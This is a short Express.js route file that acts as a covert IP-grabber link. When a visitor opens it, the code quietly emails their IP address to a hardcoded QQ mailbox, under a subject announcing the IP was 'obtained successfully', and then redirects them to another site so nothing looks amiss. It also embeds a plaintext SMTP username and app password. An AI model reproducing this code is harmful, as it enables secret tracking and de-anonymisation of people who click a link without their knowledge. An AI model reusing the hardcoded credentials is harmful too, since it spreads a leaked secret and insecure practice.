var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');

function getClientIp(req) {
  return (
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress
  );
}

function sendEmail(ip) {
  var transporter = nodemailer.createTransport({
    host: 'smtp.qq.com',
    port: 465,
    secure: true,
    auth: {
      user: '450805067@qq.com',
      pass: 'plyszthtwrrnbjeb',
    },
  });

  transporter.sendMail({
    from: '"fuzhongyi" <450805067@qq.com>',
    to: '450805067@qq.com',
    subject: '获取 ip 地址成功 👻',
    html: `<b>ip:</b>${ip}`,
  });
}

router.get('/', function (req, res, next) {
  var ip = getClientIp(req);
  sendEmail(ip);
  res.redirect('https://xyue.me/');
});

module.exports = router;
